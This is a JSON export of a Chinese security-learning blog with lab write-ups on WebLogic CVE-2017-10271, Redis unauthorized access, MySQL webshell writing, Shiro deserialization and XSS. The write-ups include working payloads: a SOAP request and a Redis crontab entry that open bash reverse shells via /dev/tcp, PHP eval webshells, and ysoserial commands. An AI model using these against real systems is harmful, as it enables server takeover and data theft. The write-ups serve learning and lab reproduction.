{"meta":{"title":"redfish的学习笔记","subtitle":"redfish的学习笔记","description":"","author":"John Doe","url":"https://REDREDREDFISH.github.io","root":"/"},"pages":[{"title":"分类","date":"2021-12-02T08:13:30.951Z","updated":"2021-12-02T08:13:30.951Z","comments":false,"path":"categories/index.html","permalink":"https://redredredfish.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-12-02T14:03:06.936Z","updated":"2021-12-02T14:03:06.936Z","comments":true,"path":"repository/index.html","permalink":"https://redredredfish.github.io/repository/index.html","excerpt":"","text":"Githubgithub: username: REDREDREDFISH # github username"},{"title":"标签","date":"2021-12-02T09:44:47.223Z","updated":"2021-12-02T08:13:30.956Z","comments":false,"path":"tags/index.html","permalink":"https://redredredfish.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-12-02T15:48:58.244Z","updated":"2021-12-02T08:13:30.952Z","comments":true,"path":"links/index.html","permalink":"https://redredredfish.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"weblogic反序列化漏洞的初级理解(一)","slug":"weblogic反序列化漏洞的初级理解-一","date":"2021-07-08T03:07:00.000Z","updated":"2021-12-06T03:09:51.923Z","comments":true,"path":"2021/07/08/weblogic反序列化漏洞的初级理解-一/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/","excerpt":"","text":"啥是weblogic WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件大概可以理解为tomcat pro max🙃 Weblogic反序列化漏洞的几个利用阶段从利用方式来看,分为三类 1.直接通过T3协议发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)2.利用T3协议配合RMP或ND接口反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用IIOP协议的CVE-2020-25513.通过 javabean XML方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729) 漏洞复现由于漏洞众多，搭建环境比较复杂，还是先利用vulhub中的CVE-2017-10271、CVE-2018-2628、CVE-2018-2894、CVE-2020-14882几个标志性的漏洞环境进行复现。 先从最古老的开始 CVE-2017-10271 影响范围：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0 docker开启环境 1root@kali:/vulhub/weblogic/CVE-2017-10271# docker-compose up -d 远古版本，环境好大先忍一下 等待的过程中先理解一下漏洞原理以及vulhub给出的poc 该漏洞主要针对weblogic的WLS-WebServices组件属于上述反序列化漏洞利用的第三类大致的原理通过传输javabean XML方式构造恶意XML数据造成代码执行 结合poc来看 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot; /&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body /&gt;&lt;/soapenv:Envelope&gt; 大概是向网站的/wls-wsat/CoordinatorPortType路径传入xml数据，这串xml目的是反弹shellOK，环境起好开始复现 访问localhost:7001/wls-wsat/CoordinatorPortType，显示wls-wsat组件的一些配置信息，表示服务已经开启本地监听6666端口 1root@kali:/# nc -l -p 6666 bp抓包重放构造好的数据包，注意字段Content-Type改为text/xml成功反弹shell，服务器执行了我们传入的/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 漏洞原理漏洞利用的过程很简单有两个疑问点 1.wls-wsat组件如何处理xml数据2.造成反序列化漏洞的关键点在哪 尝试传入任意命令在响应中看到了返回的xml数据以及整个处理过程的调用栈可以看到处理过程最后调用了java.beans.XMLDecoder方法，该方法用于将XML数据反序列化为java对象，这里造成了无回显的命令执行 根据vulhub提供的技术文档、参考大佬的分析过程可以得知大致的处理过程 1.根据POC，当我们传入&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;标签包裹的数据时，wls-wsat使用了weblogic自带的webservices处理程序来处理SOAP请求2.该处理程序首先调用weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法获取到我们传入的xml数据为var1，定义var2为处理过的var1数据3.通过var2.get()方法中的WorkAreaConstants.WORK_AREA_HEADER参数获取&lt;work:WorkContext &gt;标签中的内容4.当var3不为空时，执行readHeaderOld(var3); 5.在readHeaderOld中，实例化了WorkContextXmlInputAdapter，此时方法内的var4是java标签里的内容 6.在实例化WorkContextXmlInputAdapter中，直接调用xmlDecoder反序列化传入的xml数据，也就是处理过的var4 从整个过程中可以发现，传入的xml数据从始至终都没有受到任何过滤，wls-wsat的类似剥洋葱的处理方式一层一层揭开最后直接反序列化，这样显然是很不安全滴。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"redis未授权访问","slug":"helloworld","date":"2021-07-07T08:05:00.000Z","updated":"2021-12-06T03:10:31.762Z","comments":true,"path":"2021/07/07/helloworld/","link":"","permalink":"https://redredredfish.github.io/2021/07/07/helloworld/","excerpt":"","text":"redis未授权访问的利用方式漏洞原理： Redis&lt;3.2默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的安全策略，比如添加防火墙黑白名单等等，这样会将Redis服务暴露在公网上。如果在没有设置密码(默认为空)的情况下，会导致任意用户可以未授权访问Redis以及读取Redis的数据。攻击者利用Redis自身的提供的config命令，可以进行写文件操作，还可以将ssh公钥写入目标服务器./root/.ssh下的authotrized_keys 文件中，进而可以利用对应私钥直接使用ssh服务器登录目标服务器。漏洞的产生条件有以下两点: Redis绑定在0.0.0.0:6379,且没有进行添加安全策略，直接暴露在公网 没有设置密码认证或者弱密码，可以免密登录redis服务 漏洞复现：环境： 攻击机kali5.7.0 192.168.237.132 靶机1 Ubuntu16.04 192.168.237.128 靶机2 centOS7 192.168.237.133 redis 2.8.17 靶机1开启redis-server，攻击机./redis-cli -h 尝试连接由于靶机1没有开启安全策略且默认没有设置密码认证造成攻击机可以未授权访问且执行命令获取敏感数据 利用方式一：webshell攻击机进行未授权访问，利用redis的config set命令将webshell写入靶机2网站目录下(*Redis Config Set 命令可以动态地调整 Redis 服务器的配置) 1234config set dir #设置路径config set dbfilename #设置文件名set webshell #写入key值“webshell”对应的值save #将所有key值保存在文件中 在靶机2上查看已经写入了shell.php文件 浏览器访问http://靶机2/shell.php,发现成功写入webshell 同理可写入一句话木马\\n\\n\\n换行避免因&lt;?导致shell无法解析 菜刀成功连接 利用方式二：写入SSH公钥实现SSH登录将攻击机本机的公钥作为value，然后通过修改redis的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在靶机2的/root/.ssh下生一个授权的key，从而通过ssh登录靶机2。 1ssh-keygen -t rsa #生成ssh公钥和私钥,默认密码为空 将生成的公钥保存到ssh.txt 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ssh.txt 将保存的公钥ssh.txt写入靶机2 redis的key值ssh中 1cat /root/.ssh/ssh.txt | redis-cli -h 靶机2 -x set ssh 远程登录靶机2的redis服务，更改redis备份路径为ssh公钥存放目录 1config set dir /root/.ssh 设置上传公钥的备份文件名字为authorized_keys,保存上传攻击机使用ssh免密登录靶机2 成功登录靶机2 利用方式三：crontab定时任务，反弹shell攻击机监听9999端口 1nc -l 端口 远程登录redis，写入定时任务，一分钟后执行bash反弹shell 1234set test &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机/监听端口 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename testsave 反弹shell成功 利用方式四：执行lua脚本Redis在2.6推出了脚本功能，允许开发者使用lua语言编写脚本传到Redis中执行。暂时还没找到怎么利用lua执行系统命令。 编写lua脚本test.lua输出字符hello,world! 12local a = &quot;hello,world!&quot;return a redis-cli –eval test.lua -h 靶机2","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"未授权访问漏洞","slug":"web漏洞/未授权访问漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"redis未授权访问","slug":"redis未授权访问","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"Mysql写shell的几种方式","slug":"Mysql写shell的几种方式","date":"2021-07-06T03:04:00.000Z","updated":"2021-12-06T03:10:44.520Z","comments":true,"path":"2021/07/06/Mysql写shell的几种方式/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"Mysql写shell的几种方式当我们拿到数据库权限时，可通过数据库管理工具写入shell到目标服务器上，利用shell控制目标服务器。 复现环境：phpstudy_pro 8.1.0.6mysql 5.7.26 root权限 网站绝对路径为D:\\phpstudy_pro\\WWW 利用方式： 通过outfile写入shell尝试通过outfile写入文件 1报错[Code: 1290, SQL State: HY000]The MySQL server is running with the –secure-file-priv option so it cannot execute this statement 百度之后找到原因：mysql 5.6.34版本以后 secure_file_priv的值默认为NULL，限制无法导入和导出文件 解决办法：在my.ini配置文件[mysqld]下添加secure_file_priv =&quot;&quot;使其默认为空 新建查询select 12&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;;，成功写入shell.php文件 蚁剑连接http://localhost:122/shell.php成功 向表插入shell并查询导出将一句话木马作为数据插入test1表username字段中 1insert into`test1`(`username`) values (&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;); 查询该数据并导出到shell.php 1select username from test1 into outfile &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 蚁剑连接http://localhost:122/shell.php成功 开启全局日志写入shell首先查看全局日志是否开启 1show variables like &#x27;%general%&#x27;; 如图所示general_log=OFF全局日志未开启 1234开启全局日志 set global general_log = on; 将全局日志路径设置为shell文件路径 set global general_log_file = &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 1新建查询select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;; mysql会将执行的语句记录到全局日志，从而将shell写入网站目录 蚁剑连接成功 慢查询日志写入shell由于在mysql&gt;5.6.34中，secure_file_priv会阻拦我们使用outfile写入文件，没有服务器权限无法修改my.ini配置文件，可以利用慢查询日志写入shell，原理和利用全局日志差不多。首先一样查看慢查询日志是否开启 1show variables like &#x27;%slow_query_log%&#x27;; 开启慢查询日志并修改日志文件的绝对路径 使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中 1查询mysql系统时间 show global variables like &#x27;%long_query_time%&#x27;; 向日志中写入shell 1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);设置查询时间为11s 执行成功 蚁剑连接成功 phpMyAdmin文件包含漏洞CVE-2018-19968CVE-2018-12613CVE-2016-5734CVE-2014-8959","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql","slug":"mysql","permalink":"https://redredredfish.github.io/tags/mysql/"}],"author":"redfish"},{"title":"shiro反序列化的初级理解","slug":"shiro反序列化","date":"2021-07-06T02:37:00.000Z","updated":"2021-12-06T03:09:26.034Z","comments":true,"path":"2021/07/06/shiro反序列化/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"shiro反序列化原理rememberMe功能：shiro框架提供了rememberMe功能，这个功能大概是用户登录成功后会生成一个凭证组，shiro将它经过序列化-&gt;AES加密-&gt;Base64加密得到一串数据流传回给cookie，下次登录时，shiro通过Base64解码-&gt;AES解密-&gt;反序列化验证cookie中的rememberMe包含的凭证组是否正确，从而实现“下次登录记住我”的功能。 漏洞原理：造成shiro反序列化漏洞的关键点，一个是Shiro&lt;1.2.4中，AES-CBC加解密时key默认为硬编码，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据；另一个点是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。 漏洞利用： 首先需要获取正确的key值，利用shiro接收错误rememberMe会抛出异常返回Set-Cookie的特性，可以通过爆破，直到响应头中不包含Set-Cookie，说明key成功匹配。 接着需要对恶意数据进行序列化，shiro序列化对象只有继承PrincipalCollection时，类型转换才正常，不然会抛出异常，这里可以借助ysoserial生成序列化数据：利用ysoserial中的JRMP监听模块进行反弹shell，需使用Java Runtime 配合 bash 编码 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 监听端口CommonsCollections4 ‘bash编码’ 利用ysoserial生成.ser文件 java -jarysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 “命令” &gt; x.ser 然后进行AES加密、Base64加密，伪造cookie，执行命令 如何判断一个网站是否使用了shiro框架在请求包中的cookie字段添加rememberMe=xxx,查看响应头中是否包含rememberMe=deleteMe值例如：","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"shiro反序列化","slug":"shiro反序列化","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"XSS基础(一)","slug":"XSS基础-一","date":"2021-06-15T02:33:00.000Z","updated":"2021-12-06T03:11:09.337Z","comments":true,"path":"2021/06/15/XSS基础-一/","link":"","permalink":"https://redredredfish.github.io/2021/06/15/XSS%E5%9F%BA%E7%A1%80-%E4%B8%80/","excerpt":"","text":"原理什么是XSS其实我一直不太理解为啥反射型XSS在报告里常年作为高危漏洞，虽然说渗透学习的终点是钓鱼，但是实际工作中遇到真正能利用的其实并不多，而且这玩意有时候参数多修起来比较麻烦，心疼甲方开发三秒。 不管了先看看百度是咋解释的： XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 说的简单点，跨站脚本攻击是指攻击者往Web页面里插入恶意代码，当用户浏览时，代码会被执行，最简单的弹弹窗搞搞心态钓钓鱼啥的，当然不止xss的利用不止于此。所以造成xss的关键是用户的输入未过滤直接输出。 类型 XSS的类型常见的总共有三种，反射型、存储型、DOM型 反射型XSS 反射型XSS是最常见也是最容易验证的类型，和存储型的区别是恶意代码不存储在服务端只做交互，插入什么就输出什么，根据俺的经验，一般在无害化漏洞扫描器中扫出的XSS都是反射型XSS漏洞 。关于如何交互可以看下面这张图。 造成此类漏洞的弱点参数普遍存在于URL中，在测试中可以重点关注某些可以人为控制的参数，特别是会反映在前端的参数。 反射型最简单的payload就是弹窗验证，即&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;,&lt;script&gt; 标签用于在前端插入JS代码，alert()函数用于显示带内容的弹窗。 关于get反射和post反射，简单理解就是get型参数是你能在url里找到的，post一般在流量包里url里是看不见的，这玩意深入下去就要涉及到TCP/IP那一套了，我这种最低级的安服仔肯定不会，可以看看这位大佬的解释。 下面拿pikachu靶场举例： 谁是你最喜欢的NBA球员，当然是库里啦的(￣︶￣*))试一下payload： 123&lt;script type=&quot;text/javascript&quot;&gt;var code = prompt(&quot;请输入你的银行卡密码：&quot;);&lt;/script&gt; 可以看到弹窗了，重点关注这个URL，可见我们输入的参数被URL编码后带在里面，试想如果有人拿这个低级链接来🎣，没有安全常识的甲方爸爸确实有可能会上钩，这时候危害性就体现出来了。 存储型XSS 首先提一下，当你怀疑有存储型XSS的时候千万要先在burpsuite里重放试试，之前有一次渗透，在客户的OA里发现了一个存储型XSS，手贱存了个弹窗代码，导致整个前端格式崩溃浏览器无法渲染，最后在服务器数据库里摸了半天才找到，好端端的渗透干成应急了，血淋淋的教训😭 由上述低级事故可知存储型XSS实际的危害还是蛮大的，顾名思义存储型XSS就是将恶意代码存在服务端或者数据库，一般这种漏洞在留言、添加数据这种功能点出现的比较多，当用户去访问被存入恶意代码的页面时，恶意代码就会执行。 还是拿pikachu来举例： 还是一样在留言功能点存一个弹窗payload进去。 可以看到每次进这个页面都会弹窗。 原因是我们写入的恶意代码已经被存到了后台，当我们每次打开页面，展示留言功能就会从后台数据库里读取到这段恶意代码并交给浏览器渲染输出。 确实挺搞人心态的的┗|｀O′|┛ 。 DOM型XSS 感觉DOM型基本没遇到过，也可能是我太菜了没注意过。 首先啥是DOM?其实就是纯前端的参数接口，有了这个可以控制前端参数做动态网页但不和后端做数据交互。 所以DOM型XSS实际上是由于前端的参数人为可控造成的 看看pikachu中的DOM型XSS:提交功能点的JS代码是这样写的。大概就是输入一个网址，然后点一下what do you see?这句话就能跳转过去。显然这个str参数是我们可控的，因为在前端处理数据，那我们可以想办法让它变成恶意代码，反正浏览器只管渲染不会管语句是不是恶意。看一下pikachu提供的两个payload： 12//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行 第一个,&lt;img&gt;标签代表图片，onmouseover代表鼠标滑过事件，所以就是鼠标滑过这张图片就执行alert(&#39;xss&#39;)弹个窗第二个差不多，onclick代表鼠标点击事件为啥它说闭合掉就行？ 可以把payload带进那句代码看看： 1&quot;&lt;a href=&#x27;&quot;+&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;; 这样一看&quot;&lt;a href=&#39; &quot;+&#39;&gt;这段实际上&quot;+被当作了&lt;a&gt;标签的链接参数，显然这个标签就没用了后面&quot; &#39;&gt;what do you see?&lt;/a&gt;&quot;就是个字符串所以留下的有用的就只有&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;，这样改一改就又能拿来🎣了。 在复杂的网页环境中，会大量用到这种闭合技巧，需要结合F12或猜标签的形式来构造payload。 总结 反射型和存储型都会和服务端交互，DOM型则是纯前端。 反射型不会存在服务端或者数据库，服务端只会把收到的URL原封不动还给浏览器渲染。 判断是存储型还是反射型，只要看提交一次弹窗payload再刷新页面，不弹就是反射型，还弹就是存储型。 判断是反射型还是DOM型，只要在F12里找有没有处理参数的代码，没有就是反射型，有就是DOM型。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS","slug":"web漏洞/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}],"author":"redfish"}],"categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"未授权访问漏洞","slug":"web漏洞/未授权访问漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"web漏洞/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"redis未授权访问","slug":"redis未授权访问","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql","slug":"mysql","permalink":"https://redredredfish.github.io/tags/mysql/"},{"name":"shiro反序列化","slug":"shiro反序列化","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}]}